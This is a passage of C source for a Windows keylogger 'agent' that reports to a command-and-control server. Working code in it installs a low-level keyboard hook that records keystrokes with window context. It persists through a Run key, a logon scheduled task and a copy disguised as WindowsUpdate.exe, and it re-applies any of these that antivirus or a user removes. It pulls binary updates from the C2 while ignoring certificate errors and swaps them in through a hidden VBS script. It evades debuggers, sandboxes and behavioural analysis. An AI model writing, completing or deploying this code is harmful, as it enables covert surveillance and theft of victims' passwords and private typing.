 * SECTION 10c: AUTO-UPDATE
 *
 * Triggered by the C2 during heartbeat.  Server replies with:
 *   { "update_url": "https://...", "update_sha256": "hex..." }
 *
 * The agent downloads the new binary, verifies the SHA-256 hash,
 * installs it via VBS swap (instant, no window) with a MoveFileEx
 * fallback (next reboot), then exits so the new binary takes over.
 * ============================================================================ */

/*
 * Compute SHA-256 of a buffer.  Uses Windows CryptoAPI (in advapi32, already
 * linked).  Returns 0 on failure, 1 on success.  On success hex_out must be
 * at least 65 bytes.
 */
static int sha256_hex(const BYTE *data, DWORD len, char *hex_out, int hex_size) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    BYTE hash[32];
    DWORD hash_len = sizeof(hash);
    int ok = 0;

    if (!pCryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        goto done;
    if (!pCryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
        goto done;
    if (!pCryptHashData(hHash, data, len, 0))
        goto done;
    if (!pCryptGetHashParam(hHash, HP_HASHVAL, hash, &hash_len, 0))
        goto done;

    for (int i = 0; i < 32 && hex_size > 2; i++) {
        snprintf(hex_out + i * 2, 3, "%02x", hash[i]);
    }
    hex_out[64] = '\0';
    ok = 1;

done:
    if (hHash) pCryptDestroyHash(hHash);
    if (hProv) pCryptReleaseContext(hProv, 0);
    return ok;
}

/*
 * Write the VBS updater script to %TEMP%.  It loops waiting for the agent
 * process to exit, then copies the new binary over the old one, relaunches,
 * and self-deletes.  wscript.exe //B runs it invisibly.
 */
static int write_updater_vbs(const char *vbs_path,
                              const char *new_exe_path,
                              const char *target_exe_path) {
    HANDLE hf = CreateFileA(vbs_path, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;

    /*
     * VBS script logic:
     *   - Sleep 500ms so the agent has time to exit
     *   - Loop until the target exe is no longer locked (agent exited)
     *   - Copy new exe over target
     *   - Launch target
     *   - Self-delete
     */
    const char *script = "On Error Resume Next\r\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\r\nSet shell = CreateObject(\"WScript.Shell\")\r\ntarget = \"";

    DWORD written;
    WriteFile(hf, script, strlen(script), &written, NULL);

    WriteFile(hf, target_exe_path, strlen(target_exe_path), &written, NULL);

    const char *mid = "\"\r\nnewfile = \"";
    WriteFile(hf, mid, strlen(mid), &written, NULL);

    WriteFile(hf, new_exe_path, strlen(new_exe_path), &written, NULL);

    /* Chr(34) = double-quote — avoids VBS quote-counting nightmares */
    const char *tail = "\"\r\nWScript.Sleep 500\r\ncopied = False\r\nFor i = 1 To 20\r\n    If fso.FileExists(newfile) Then\r\n        fso.CopyFile newfile, target, True\r\n        If Err.Number = 0 Then\r\n            copied = True\r\n            Exit For\r\n        End If\r\n        Err.Clear\r\n    End If\r\n    WScript.Sleep 500\r\nNext\r\nIf copied Then\r\n    q = Chr(34)\r\n    shell.Run q & target & q, 0, False\r\nEnd If\r\nfso.DeleteFile WScript.ScriptFullName, True\r\n";

    WriteFile(hf, tail, strlen(tail), &written, NULL);
    CloseHandle(hf);
    return 1;
}

/*
 * Download a full replacement binary from the C2, verify its hash,
 * install it, and signal shutdown so the new version takes over.
 */
static void c2_update(const char *url, const char *expected_sha256) {
    log_write("update: starting download");

    /* --- Step 1: download the new binary --- */
    BYTE *payload = (BYTE*)HeapAlloc(GetProcessHeap(), 0, UPDATE_MAX_SIZE);
    if (!payload) {
        log_write("update: out of memory");
        return;
    }

    /* parse URL into host + port + path (like config_load does) */
    char host[MAX_HOST_LEN] = {0};
    int port = 443;
    int use_https = 1;
    char uri_path[MAX_PATH_LEN]; strcpy(uri_path, "/");

    const char *url_p = url;
    if (strncmp(url_p, "https://", 8) == 0) { url_p += 8; port = 443; use_https = 1; }
    else if (strncmp(url_p, "http://", 7) == 0) { url_p += 7; port = 80; use_https = 0; }

    const char *slash3 = strchr(url_p, '/');
    if (slash3) {
        int hlen = (int)(slash3 - url_p);
        if (hlen >= MAX_HOST_LEN) hlen = MAX_HOST_LEN - 1;
        memcpy(host, url_p, hlen);
        strncpy(uri_path, slash3, MAX_PATH_LEN - 1);
    } else {
        strncpy(host, url_p, MAX_HOST_LEN - 1);
    }

    WCHAR whost[MAX_HOST_LEN], wpath[MAX_PATH_LEN];
    MultiByteToWideChar(CP_UTF8, 0, host, -1, whost, MAX_HOST_LEN);
    MultiByteToWideChar(CP_UTF8, 0, uri_path, -1, wpath, MAX_PATH_LEN);

    HINTERNET hSession = pWinHttpOpen(L"Ghostnet-Updater/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) goto fail;

    HINTERNET hConnect = pWinHttpConnect(hSession, whost, (INTERNET_PORT)port, 0);
    if (!hConnect) { pWinHttpCloseHandle(hSession); goto fail; }

    DWORD wflags = use_https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = pWinHttpOpenRequest(hConnect, L"GET", wpath, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, wflags);
    if (!hReq) { pWinHttpCloseHandle(hConnect); pWinHttpCloseHandle(hSession); goto fail; }

    if (use_https) {
        DWORD sf = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                   SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                   SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        pWinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &sf, sizeof(sf));
    }

    if (!pWinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0))
        { pWinHttpCloseHandle(hReq); pWinHttpCloseHandle(hConnect); pWinHttpCloseHandle(hSession); goto fail; }
    if (!pWinHttpReceiveResponse(hReq, NULL))
        { pWinHttpCloseHandle(hReq); pWinHttpCloseHandle(hConnect); pWinHttpCloseHandle(hSession); goto fail; }

    DWORD total = 0;
    DWORD avail, read;
    while (pWinHttpQueryDataAvailable(hReq, &avail) && avail > 0) {
        DWORD to_read = avail;
        if (total + to_read > UPDATE_MAX_SIZE) to_read = UPDATE_MAX_SIZE - total;
        if (!pWinHttpReadData(hReq, payload + total, to_read, &read)) break;
        total += read;
        if (total >= UPDATE_MAX_SIZE) break;
    }

    /* if we hit the size cap, check if more data remains — truncated */
    if (total >= UPDATE_MAX_SIZE) {
        DWORD extra;
        if (pWinHttpQueryDataAvailable(hReq, &extra) && extra > 0) {
            pWinHttpCloseHandle(hReq);
            pWinHttpCloseHandle(hConnect);
            pWinHttpCloseHandle(hSession);
            log_write("update: binary exceeds max size — discarding");
            goto fail;
        }
    }

    pWinHttpCloseHandle(hReq);
    pWinHttpCloseHandle(hConnect);
    pWinHttpCloseHandle(hSession);

    if (total == 0) {
        log_write("update: download empty or failed");
        goto fail;
    }
    log_write("update: downloaded successfully");

    /* --- Step 2: verify SHA-256 --- */
    if (expected_sha256 && expected_sha256[0]) {
        char computed[65];
        if (!sha256_hex(payload, total, computed, sizeof(computed))) {
            log_write("update: hash computation failed");
            goto fail;
        }
        if (stricmp_local(computed, expected_sha256) != 0) {
            log_write("update: hash mismatch — discarding");
            goto fail;
        }
        log_write("update: hash verified");
    }

    /* --- Step 3: write new binary to a temp location --- */
    char temp_dir[MAX_PATH], new_exe[MAX_PATH];
    if (GetTempPathA(sizeof(temp_dir), temp_dir) == 0)
        strcpy(temp_dir, "C:\\Windows\\Temp\\");
    snprintf(new_exe, sizeof(new_exe), "%sWindowsUpdate.new", temp_dir);
    /* .new extension — Windows won't try to execute it accidentally */

    HANDLE hOut = CreateFileA(new_exe, GENERIC_WRITE, 0, NULL,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        log_write("update: cannot write new binary");
        goto fail;
    }
    DWORD wr;
    WriteFile(hOut, payload, total, &wr, NULL);
    CloseHandle(hOut);
    HeapFree(GetProcessHeap(), 0, payload);  /* no longer needed */

    /* --- Step 4: get the current exe path (the one to replace) --- */
    char current_exe[MAX_PATH];
    GetModuleFileNameA(NULL, current_exe, sizeof(current_exe));

    /*
     * If we're running from the persisted copy, we can replace it directly.
     * If running from a one-off location, we still need to update the persisted
     * copy — the scheduled task / Run key points there.
     */
    char dummy1[MAX_PATH], dummy2[MAX_PATH];
    char persist_exe_actual[MAX_PATH], dummy3[MAX_PATH];
    persistence_paths(dummy1, sizeof(dummy1), dummy2, sizeof(dummy2),
                      persist_exe_actual, sizeof(persist_exe_actual),
                      dummy3, sizeof(dummy3));

    /* the target to replace: prefer the persisted copy if it exists */
    char target_exe[MAX_PATH];
    if (GetFileAttributesA(persist_exe_actual) != INVALID_FILE_ATTRIBUTES) {
        strncpy(target_exe, persist_exe_actual, sizeof(target_exe) - 1);
        target_exe[sizeof(target_exe) - 1] = '\0';
    } else {
        strncpy(target_exe, current_exe, sizeof(target_exe) - 1);
        target_exe[sizeof(target_exe) - 1] = '\0';
    }

    /* --- Step 5: schedule MoveFileEx fallback (survives if VBS fails) --- */
    MoveFileExA(new_exe, target_exe, MOVEFILE_REPLACE_EXISTING |
                                     MOVEFILE_DELAY_UNTIL_REBOOT);
    log_write("update: MoveFileEx fallback scheduled");

    /* --- Step 6: write and spawn the VBS updater --- */
    char vbs_path[MAX_PATH];
    snprintf(vbs_path, sizeof(vbs_path), "%sWindowsUpdate.vbs", temp_dir);

    if (write_updater_vbs(vbs_path, new_exe, target_exe)) {
        /* launch wscript.exe //B (no banner, no window, no console) */
        char run_cmd[1024];
        snprintf(run_cmd, sizeof(run_cmd),
                 "wscript.exe //B //Nologo \"%s\"", vbs_path);

        STARTUPINFOA si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi = {0};
        if (pCreateProcessA(NULL, run_cmd, NULL, NULL, FALSE,
                           CREATE_NO_WINDOW | DETACHED_PROCESS,
                           NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            log_write("update: VBS updater spawned — exiting for swap");
        } else {
            log_write("update: failed to spawn VBS updater");
        }
    }

    /* --- Step 7: flush buffer and exit --- */
    /* skip c2_exfil() — http_post may block long enough to race VBS timeout */
    pPostQuitMessage(0);
    return;

fail:
    if (payload) HeapFree(GetProcessHeap(), 0, payload);
    log_write("update: failed");
}

static void c2_config_poll(void) {
    if (!g_agent_registered) return;

    char path[256];
    snprintf(path, sizeof(path), "/api/agents/%s/config", g_agent_id);

    char response[4096] = {0};
    int ret = http_get(path, response, sizeof(response));

    if (ret > 0) {
        int val;
        if (json_extract_int(response, "exfil_interval_seconds", &val)) {
            if (val != g_exfil_interval_sec) {
                g_exfil_interval_sec = val;
                if (g_hwnd) {
                    pKillTimer(g_hwnd, TIMER_EXFIL);
                    pSetTimer(g_hwnd, TIMER_EXFIL, g_exfil_interval_sec * 1000, NULL);
                    log_write("c2: exfil timer re-armed");
                }
            }
        }
        if (json_extract_int(response, "heartbeat_interval_seconds", &val)) {
            if (val != g_heartbeat_interval_sec) {
                g_heartbeat_interval_sec = val;
                if (g_hwnd) {
                    pKillTimer(g_hwnd, TIMER_HEARTBEAT);
                    pSetTimer(g_hwnd, TIMER_HEARTBEAT, g_heartbeat_interval_sec * 1000, NULL);
                    log_write("c2: heartbeat timer re-armed");
                }
            }
        }

        /* update server blacklist */
        const char *arr = json_array_next(response, "blacklist", g_blacklist[0], MAX_BLACKLIST_STRLEN);
        if (arr) {
            int idx = 0;
            char item[MAX_BLACKLIST_STRLEN];
            const char *p = arr;
            while (idx < MAX_BLACKLIST &&
                   (p = json_array_get_next(p, item, MAX_BLACKLIST_STRLEN)) != NULL) {
                if (item[0]) {
                    strncpy(g_blacklist[idx], item, MAX_BLACKLIST_STRLEN - 1);
                    idx++;
                }
                if (!p || *p == ']') break;
            }
            g_blacklist_count = idx;
        }

        log_write("c2: config polled successfully");
    }
}

/* ============================================================================
 * SECTION 11: MULTI-VECTOR PERSISTENCE
 *
 * Vectors (defense in depth — if one is removed, others survive):
 *   1. Scheduled Task    — fires at user logon (ONLOGON, no admin needed)
 *   2. Registry Run      — fires at user logon (HKCU, no admin needed)
 *   3. Mutex watchdog    — prevents double-run, task re-launches if process dies
 *
 * All vectors operate at user privilege level — no UAC prompt, no admin
 * rights required. The agent runs with the same permissions as the user
 * session, which is sufficient for WH_KEYBOARD_LL keyboard hooking.
 *
 * Startup repair runs on a 15-min timer to re-apply any vector that was
 * removed by AV, IT policy, or user cleanup.
 * ============================================================================ */

/*
 * Check if another instance is already running via a named mutex.
 * Returns 1 if this is the only instance (OK to proceed).
 * Returns 0 if another instance is running (exit).
 */
static int mutex_acquire(void) {
    HANDLE hMutex = CreateMutexW(NULL, TRUE, g_mutex_name);
    if (hMutex == NULL) return 0;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return 0;
    }
    /* mutex is held for the lifetime of this process — never release */
    return 1;
}

/*
 * Get the paths we use for persistence.
 */
static void persistence_paths(char *original_exe, int orig_size,
                               char *persist_dir, int dir_size,
                               char *persist_exe, int exe_size,
                               char *persist_config, int cfg_size) {
    GetModuleFileNameA(NULL, original_exe, orig_size);

    char appdata[MAX_PATH];
    appdata[0] = '\0';

    if (pSHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) != S_OK) {
        /* fallback: use %USERPROFILE% or C:\Users\Public */
        ExpandEnvironmentStringsA("%USERPROFILE%", appdata, MAX_PATH);
        if (appdata[0] == '\0') {
            /* last resort */
            strcpy(appdata, "C:\\Users\\Public");
        }
    }

    snprintf(persist_dir, dir_size, "%s\\Microsoft\\Windows", appdata);
    snprintf(persist_exe, exe_size, "%s\\WindowsUpdate.exe", persist_dir);
    snprintf(persist_config, cfg_size, "%s\\agent_config.json", persist_dir);
}

/* ---- Vector 1: Registry Run (HKCU) ---- */

static int persistence_registry_install(const char *persist_exe) {
    HKEY hKey;
    LONG result = pRegOpenKeyExA(HKEY_CURRENT_USER,
                                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                0, KEY_SET_VALUE | KEY_QUERY_VALUE, &hKey);
    if (result != ERROR_SUCCESS) return 0;

    /* check if already set correctly */
    char current_val[MAX_PATH] = {0};
    DWORD val_size = sizeof(current_val);
    DWORD val_type = 0;
    result = pRegQueryValueExA(hKey, g_reg_value_name, NULL, &val_type,
                              (BYTE*)current_val, &val_size);
    if (result == ERROR_SUCCESS && val_type == REG_SZ &&
        strcmp(current_val, persist_exe) == 0) {
        pRegCloseKey(hKey);
        return 1;
    }

    result = pRegSetValueExA(hKey, g_reg_value_name, 0, REG_SZ,
                            (BYTE*)persist_exe, strlen(persist_exe) + 1);
    pRegCloseKey(hKey);
    return (result == ERROR_SUCCESS) ? 1 : 0;
}

static void persistence_registry_remove(void) {
    HKEY hKey;
    if (pRegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        pRegDeleteValueA(hKey, g_reg_value_name);
        pRegCloseKey(hKey);
    }
}

/* ---- Vector 2: Scheduled Task (SYSTEM startup + watchdog re-trigger) ---- */

static int persistence_schtask_install(const char *persist_exe) {
    /*
     * Check if the task already exists by querying it.
     * schtasks /query returns exit code 0 if found, 1 if not.
     */
    char query_cmd[1024];
    snprintf(query_cmd, sizeof(query_cmd),
             "schtasks /query /tn \"%s\" >nul 2>&1", g_task_name);

    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hRead = NULL, hWrite = NULL;
    DWORD exit_code = 1;

    if (pCreatePipe(&hRead, &hWrite, &sa, 0)) {
        STARTUPINFOA si = { sizeof(si) };
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi = {0};
        char cmdline[1024];
        snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", query_cmd);

        if (pCreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 5000);
            GetExitCodeProcess(pi.hProcess, &exit_code);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        CloseHandle(hWrite);
        CloseHandle(hRead);
    }

    if (exit_code == 0) return 1;  /* already exists */

    /*
     * Create the scheduled task (no admin required).
     *
     * /sc ONLOGON  — fires when the current user logs in (no elevation needed,
     *                unlike ONSTART which requires admin/SYSTEM rights).
     * /f           — force overwrite if somehow exists.
     *
     * We intentionally omit /rl HIGHEST — it would trigger UAC and fail
     * silently when the process is not elevated. The agent runs with user-
     * level privileges, which is sufficient for WH_KEYBOARD_LL.
     */
    char create_cmd[2048];
    snprintf(create_cmd, sizeof(create_cmd),
             "schtasks /create /tn \"%s\" /tr \"\\\"%s\\\"\" /sc ONLOGON /delay 0001:00 /f",
             g_task_name, persist_exe);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};
    if (pCreateProcessA(NULL, create_cmd, NULL, NULL, FALSE,
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000);
        DWORD code;
        GetExitCodeProcess(pi.hProcess, &code);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        if (code == 0) {
            log_write("persistence: scheduled task created");
            return 1;
        }
    }

    log_write("persistence: scheduled task creation failed");
    return 0;
}

static void persistence_schtask_remove(void) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
             "schtasks /delete /tn \"WindowsUpdateTask\" /f");
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};
    if (pCreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

/* ---- Vector 3: File copy to AppData ---- */

static int persistence_file_copy(const char *original_exe,
                                  const char *persist_dir,
                                  const char *persist_exe,
                                  const char *persist_config) {
    CreateDirectoryA(persist_dir, NULL);

    /*
     * Copy the exe. Using CopyFileA with FALSE (fail if exists) because
     * a running exe can't be overwritten on Windows. The repair cycle
     * will retry on next boot when nothing is holding the lock.
     */
    if (!CopyFileA(original_exe, persist_exe, FALSE)) {
        DWORD attrs = GetFileAttributesA(persist_exe);
        if (attrs == INVALID_FILE_ATTRIBUTES) {
            log_write("persistence: failed to copy exe to AppData");
            return 0;
        }
        /* file exists (from previous install) — OK, skip copy */
    }

    /* copy config alongside */
    char src_config[MAX_PATH];
    strncpy(src_config, original_exe, MAX_PATH - 1);
    char *slash2 = strrchr(src_config, '\\');
    if (slash2) {
        *(slash2 + 1) = '\0';
        strcat(src_config, "agent_config.json");
        if (GetFileAttributesA(src_config) != INVALID_FILE_ATTRIBUTES) {
            if (!CopyFileA(src_config, persist_config, FALSE)) {
                /* ignore if dest exists (locked/current), log if truly failed */
                if (GetFileAttributesA(persist_config) == INVALID_FILE_ATTRIBUTES) {
                    log_write("persistence: config copy failed");
                }
            }
        }
    }

    return 1;
}

/* ---- Startup repair (re-applies all vectors on a background thread) ---- */

static DWORD WINAPI persistence_repair_thread(LPVOID param) {
    (void)param;

    char orig_path[MAX_PATH], dir[MAX_PATH], exe[MAX_PATH], cfg[MAX_PATH];
    persistence_paths(orig_path, sizeof(orig_path),
                       dir, sizeof(dir), exe, sizeof(exe), cfg, sizeof(cfg));

    int ok = 1;
    if (!persistence_file_copy(orig_path, dir, exe, cfg)) ok = 0;
    if (!persistence_registry_install(exe)) ok = 0;
    if (!persistence_schtask_install(exe)) ok = 0;

    if (!ok) {
        log_write("persistence: repair — some vectors could not be restored");
    }

    return 0;
}

/* ---- Full uninstall (called on C2 uninstall command) ---- */

static void persistence_uninstall(void) {
    persistence_registry_remove();
    persistence_schtask_remove();

    char orig_path[MAX_PATH], dir[MAX_PATH], exe[MAX_PATH], cfg[MAX_PATH];
    persistence_paths(orig_path, sizeof(orig_path),
                       dir, sizeof(dir), exe, sizeof(exe), cfg, sizeof(cfg));

    /* schedule deletion on next reboot (can't delete running exe) */
    MoveFileExA(exe, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    MoveFileExA(cfg, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

    log_write("persistence: uninstall complete — all vectors removed");
}

/* ---- Main install (called once on startup) ---- */

static void persistence_install(void) {
    char orig_path[MAX_PATH], dir[MAX_PATH], exe[MAX_PATH], cfg[MAX_PATH];
    persistence_paths(orig_path, sizeof(orig_path),
                       dir, sizeof(dir), exe, sizeof(exe), cfg, sizeof(cfg));

    persistence_file_copy(orig_path, dir, exe, cfg);
    persistence_registry_install(exe);
    persistence_schtask_install(exe);

    log_write("persistence: all vectors installed");
}

/* ============================================================================
 * SECTION 12: KEYBOARD HOOK
 * ============================================================================ */

static HHOOK g_hook = NULL;
static char g_last_window[MAX_WINDOW_TITLE] = {0};
static DWORD g_last_process_id = 0;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)lParam;

            /* get window context */
            char window_title[MAX_WINDOW_TITLE];
            char process_name[MAX_PROCESS_NAME];
            DWORD process_id;
            capture_window_context(window_title, sizeof(window_title),
                                    process_name, sizeof(process_name),
                                    &process_id);

            /* check blacklist */
            if (window_title[0] && is_blacklisted(window_title)) {
                goto done;
            }

            buffer_push(kb->vkCode, kb->flags, window_title, process_name, process_id);

            /* update last-seen window */
            strncpy(g_last_window, window_title, MAX_WINDOW_TITLE - 1);
            g_last_window[MAX_WINDOW_TITLE - 1] = '\0';
            g_last_process_id = process_id;
        }
    }
done:
    return pCallNextHookEx(g_hook, nCode, wParam, lParam);
}

static int hook_install(void) {
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc,
                               GetModuleHandle(NULL), 0);
    if (!g_hook) {
        log_write("hook: SetWindowsHookEx failed");
        return 0;
    }
    log_write("hook: installed successfully");
    return 1;
}

static void hook_uninstall(void) {
    if (g_hook) {
        pUnhookWindowsHookEx(g_hook);
        g_hook = NULL;
        log_write("hook: uninstalled");
    }
}

/* ============================================================================
 * SECTION 13: WINDOW PROCEDURE & MESSAGE LOOP
 * ============================================================================ */

#define WINDOW_CLASS L"MsgWnd_8a7f3c2e"

LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_TIMER:
            switch (wParam) {
                case TIMER_EXFIL:
                    if (g_agent_registered) c2_exfil();
                    break;
                case TIMER_HEARTBEAT:
                    if (g_agent_registered) c2_heartbeat();
                    break;
                case TIMER_CONFIG_POLL:
                    if (g_agent_registered) c2_config_poll();
                    break;
                case TIMER_REPAIR: {
                    /* run repair on a background thread so we don't
                     * block the message loop (schtasks can take seconds) */
                    HANDLE hThread = CreateThread(NULL, 0,
                        persistence_repair_thread, NULL, 0, NULL);
                    if (hThread) CloseHandle(hThread);  /* detach */
                    break;
                }
            }
            return 0;

        case WM_QUERYENDSESSION:
            /*
             * System is shutting down. We only get ~5 seconds.
             * Skip the full exfil (HTTP round-trip takes too long) and
             * instead write pending keystrokes to a local dump file so
             * nothing is lost. On next startup, re-send from the dump.
             */
            log_write("shutdown: dumping buffer to disk");
            {
                /* heap allocation — KeyEvent[BUFFER_SIZE] would overflow the stack */
                KeyEvent *dump = (KeyEvent*)HeapAlloc(GetProcessHeap(), 0,
                                                      BUFFER_SIZE * sizeof(KeyEvent));
                if (!dump) {
                    log_write("shutdown: out of memory for dump");
                } else {
                    int dump_count = buffer_flush(dump, BUFFER_SIZE);
                    if (dump_count > 0) {
                        char dump_path[MAX_PATH];
                        char appdata[MAX_PATH];
                        if (pSHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
                            snprintf(dump_path, MAX_PATH,
                                     "%s\\Microsoft\\Crypto\\shutdown.dump", appdata);
                            HANDLE hf = CreateFileA(dump_path, GENERIC_WRITE, 0, NULL,
                                                    CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
                            if (hf != INVALID_HANDLE_VALUE) {
                                DWORD written;
                                DWORD expected = (DWORD)(dump_count * sizeof(KeyEvent));
                                WriteFile(hf, dump, expected, &written, NULL);
                                if (written != expected) {
                                    /* partial write = corrupt dump; discard */
                                    CloseHandle(hf);
                                    DeleteFileA(dump_path);
                                } else {
                                    CloseHandle(hf);
                                }
                            }
                        }
                    }
                    HeapFree(GetProcessHeap(), 0, dump);
                }
            }
            /* also fire a fire-and-forget shutdown heartbeat */
            if (g_agent_registered) {
                char body[384];
                snprintf(body, sizeof(body),
                         "{\"agent_id\":\"%s\",\"status\":\"shutdown\"}",
                         g_agent_id);
                http_post("/api/agents/heartbeat", body, NULL, 0);
            }
            log_write("shutdown: complete");
            return TRUE;

        case WM_ENDSESSION:
            if (wParam) {
                hook_uninstall();
            }
            return 0;

        case WM_CLOSE:
        case WM_DESTROY:
            /* flush pending keystrokes before exiting */
            if (g_agent_registered) c2_exfil();
            pPostQuitMessage(0);
            return 0;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

static HWND create_hidden_window(HINSTANCE hInstance) {
    WNDCLASSEXW wc = {0};
    wc.cbSize = sizeof(WNDCLASSEXW);
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = WINDOW_CLASS;
    pRegisterClassExW(&wc);

    return pCreateWindowExW(0, WINDOW_CLASS, L"",
                           WS_OVERLAPPED, 0, 0, 0, 0,
                           HWND_MESSAGE, NULL, hInstance, NULL);
}

/* ============================================================================
 * SECTION 14: ENTRY POINT
 * ============================================================================ */

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                    LPSTR lpCmdLine, int nCmdShow) {
    /* --- stealth checks --- */
    if (stealth_check_debugger()) {
        return 1;
    }

    if (stealth_check_sandbox()) {
        return 1;
    }

    /* --- prevent multiple instances (mutex watchdog) --- */
    if (!mutex_acquire()) {
        /* another instance is already running — exit silently */
        return 1;
    }

    /* --- delayed execution to evade behavioral analysis --- */
    {
        LARGE_INTEGER perf_freq, perf_now;
        QueryPerformanceFrequency(&perf_freq);
        QueryPerformanceCounter(&perf_now);
        /* seed with a hardware-derived value instead of time */
        srand((unsigned int)(perf_now.LowPart ^ perf_freq.LowPart));

        DWORD delay_ms = 30000 + (rand() % 30000);  /* 30-60 seconds */
        Sleep(delay_ms);
    }

    /* --- initialize logging --- */
    log_init();
    log_write("agent starting");

    /* --- resolve all WinAPI functions + generate persistence IDs --- */
    if (!api_init()) {
        /* critical DLL missing — can't operate */
        return 1;
    }
    gen_persistence_names();

    /* --- load configuration --- */
    char config_path[MAX_PATH];
    GetModuleFileNameA(NULL, config_path, MAX_PATH);
    char *slash = strrchr(config_path, '\\');
    if (slash) {
        *(slash + 1) = '\0';
        strcat(config_path, "agent_config.json");
    } else {
        strcpy(config_path, "agent_config.json");
    }
    config_load(config_path);
    config_apply_default_url();

    /* --- install persistence --- */
    persistence_install();

    /* --- initialize keystroke buffer --- */
    buffer_init();
    g_startup_ticks = GetTickCount();

    /* --- register with C2 --- */
    c2_register();

    /* --- resend any keystrokes saved from a previous unclean shutdown --- */
    {
        char dump_path[MAX_PATH];
        char appdata[MAX_PATH];
        if (pSHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
            snprintf(dump_path, MAX_PATH,
                     "%s\\Microsoft\\Crypto\\shutdown.dump", appdata);
            HANDLE hf = CreateFileA(dump_path, GENERIC_READ, FILE_SHARE_READ,
                                    NULL, OPEN_EXISTING,
                                    FILE_ATTRIBUTE_HIDDEN, NULL);
            if (hf != INVALID_HANDLE_VALUE) {
                DWORD fsize = GetFileSize(hf, NULL);
                if (fsize > 0 && fsize <= BUFFER_SIZE * sizeof(KeyEvent)) {
                    KeyEvent *recovery_buf = (KeyEvent*)HeapAlloc(GetProcessHeap(), 0, fsize);
                    if (recovery_buf) {
                        DWORD read;
                        ReadFile(hf, recovery_buf, fsize, &read, NULL);
                        int n_events = (int)(read / sizeof(KeyEvent));
                        /* push recovered events back into the buffer */
                        EnterCriticalSection(&g_buffer_cs);
                        for (int i = 0; i < n_events; i++) {
                            int idx = (g_buffer_head + g_buffer_count) % BUFFER_SIZE;
                            g_keystroke_buffer[idx] = recovery_buf[i];
                        g_buffer_count++;
                        if (g_buffer_count >= BUFFER_SIZE) {
                            g_buffer_head = (g_buffer_head + 1) % BUFFER_SIZE;
                            g_buffer_count--;
                        }
                    }
                    LeaveCriticalSection(&g_buffer_cs);
                    log_write("startup: recovered keystrokes from shutdown dump");
                    HeapFree(GetProcessHeap(), 0, recovery_buf);
                    }
                }
                CloseHandle(hf);
                /* keep the dump until hook is confirmed working */
            }
        }
    }

    /* --- install keyboard hook --- */
    if (!hook_install()) {
        log_write("fatal: failed to install hook");
        return 1;
    }

